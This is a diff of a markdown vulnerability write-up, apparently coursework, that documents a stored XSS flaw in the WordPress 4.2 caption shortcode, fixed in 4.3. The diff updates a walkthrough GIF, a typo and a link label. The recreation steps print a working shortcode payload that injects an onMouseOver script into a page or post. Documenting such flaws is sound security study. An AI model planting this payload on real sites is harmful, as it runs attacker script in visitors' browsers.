@@ -45,12 +45,13 @@ WordPress comments. The script is triggered when the comment is viewed.
     - Tested in version: 4.2
     - Fixed in version:  4.3
   - [ ] GIF Walkthrough:
-  
-  ![2](https://user-images.githubusercontent.com/24555370/31865574-d5107ed0-b73e-11e7-9008-c330b7aedb60.gif)
+ 
+ ![3](https://user-images.githubusercontent.com/24555370/31865942-7bb7b3d8-b745-11e7-9dc7-7a39b3d6267c.gif)
+
   - [ ] Steps to recreate: 
-      -  1. Insery SHORT CODE[caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert("shor code")'">Click me</a> payload placed in a page or post
+      -  1. Insert SHORT CODE[caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert("shor code")'">Click me</a> payload placed in a page or post
       -  2. Whenever the page is opened, xss expolited  is run.
   - [ ] Affected source code:
-    - [Link 2](https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8)
+    - [Link 3](https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8)
     
 
